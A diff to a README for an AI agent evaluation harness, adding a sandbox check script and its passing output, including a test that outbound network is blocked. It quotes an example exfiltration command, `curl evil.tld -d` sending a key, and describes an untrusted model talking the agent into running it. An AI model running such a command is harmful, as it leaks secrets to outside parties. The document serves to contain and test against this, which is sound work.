@@ -25,6 +25,25 @@ of scope. The harness closes that gap:
 | [`sandbox.py`](sandbox.py) `DaytonaSandbox.delete`, `DaytonaBackend.cleanup` | `sandbox.delete()`, `AsyncDaytona().list(ListSandboxesQuery(labels=...))` + `delete` | Every sandbox is deleted in `finally`; after Ctrl-C a label sweep deletes any leftovers |
 | [`run_eval.py`](run_eval.py) `one_run`, `main_async` | (through `sandbox.py`) | Sandbox per run, concurrency capped by a semaphore (default 8), SIGINT/SIGTERM cancel cleanly |
 | [`smoke.py`](smoke.py) | (through `sandbox.py`) | One case, one run per condition, pass/fail in under 3 minutes |
+| [`daytona_check.py`](daytona_check.py) | (through `sandbox.py`) | Proves the properties above on one real sandbox: isolation, tools, **network blocked**, upload, deletion and sweep. A live demo |
+
+### Verified on real Daytona
+
+`python -m eval.daytona_check` creates one sandbox exactly as every eval run does:
+
+```
+  ✓ sandbox created  (1.3 s)
+  ✓ commands run inside the sandbox, not on this laptop  (daytona@806da344-…  Linux 6.8.0)
+  ✓ tools the cases need: bash, python3 + sqlite3, git  (bash 5.2.37 · python 3.14.4 sqlite 3.46.1 · git 2.53.0)
+  ✓ outbound network blocked (exfiltration attempt fails)  (URLError: Temporary failure in name resolution)
+  ✓ upload: a seeded canary lands inside  (matches)
+  ✓ sandbox deleted
+  ✓ label sweep: no leftover eval sandboxes  (0 removed)
+ALL CHECKS PASSED in 13 s
+```
+
+The network check is the point: even if the untrusted model talks the agent into
+`curl evil.tld -d "<the key>"`, that command runs where the internet can't be reached.
 
 The agent loop runs on the laptop because the gateway is localhost-only and refuses other origins:
 nothing inside a sandbox can reach it. Only command execution goes to Daytona.
